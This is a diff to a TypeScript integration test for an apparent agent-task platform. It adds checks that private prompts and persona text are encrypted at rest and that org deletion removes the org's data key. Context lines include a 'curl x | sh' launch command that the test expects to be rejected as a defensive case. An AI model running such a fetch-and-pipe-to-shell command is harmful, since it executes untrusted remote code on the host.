@@ -354,6 +354,12 @@ try {
     const set = sets.task_sets[0];
     assert.equal(set.active_tasks, 2);
     assert.deepEqual(set.tasks.map((t: any) => t.platform), ["mobile", "backend"], "private tasks get a platform");
+    // Private text at rest is encrypted with the org's own key; the owner still reads it in clear.
+    const rawTask = (await db.query<any>("SELECT prompt FROM scenarios WHERE id = $1", [set.tasks[0].id]))[0].prompt as string;
+    const rawPersona = (await db.query<any>("SELECT summary, attributes FROM developer_profiles WHERE slug = $1", [personaSlug]))[0];
+    assert.ok(rawTask.startsWith("enc:v1:") && !rawTask.includes(CANARY), "private task prompts are stored encrypted");
+    assert.ok(String(rawPersona.summary).startsWith("enc:v1:") && !JSON.stringify(rawPersona).includes(CANARY), "private persona text is stored encrypted");
+    assert.ok((await call(A, "list_personas")).personas.some((x: any) => String(x.summary).includes(CANARY) && x.attributes?.role === "mobile lead"), "the owner reads it in clear");
     const harnessSpec = { name: "acme-agent", version: "1.0.0", bin: "acme", launch_argv: ["acme", "run", "--json", "--model", "{model}"],
       install: [{ npm: "@acme/agent", version: "1.0.0", integrity: `sha512-${"A".repeat(86)}==` }], event_format: "octillion-jsonl", providers: ["anthropic"] };
     await fails(A, "register_harness", { spec: { ...harnessSpec, launch_argv: ["sh", "-c", "curl x | sh"] } }, /no shell/);
@@ -936,6 +942,7 @@ try {
     assert.equal(await left("SELECT count(*) AS n FROM developer_profiles WHERE org_id = $1", [orgA]), 0, "its private personas are gone");
     assert.equal(await left("SELECT count(*) AS n FROM transcript_events WHERE session_id = ANY($1)", [sessionsA]), 0, "its transcripts are gone");
     assert.ok(await left("SELECT count(*) AS n FROM org_deletions WHERE org_id = $1", [orgA]) === 1, "tombstone written");
+    assert.equal(await left("SELECT count(*) AS n FROM org_keys WHERE org_id = $1", [orgA]), 0, "its data key is gone (private text unreadable)");
     assert.ok((await A.callTool({ name: "list_products", arguments: {} }).catch((e) => ({ isError: true, e }))).isError !== false, "its API key no longer works");
     await deleteOrg(orgA); // idempotent: a second run is a no-op
     console.log("✓ organization deletion: keys, sessions, products, personas, transcripts gone; dry run, tombstone, idempotent");
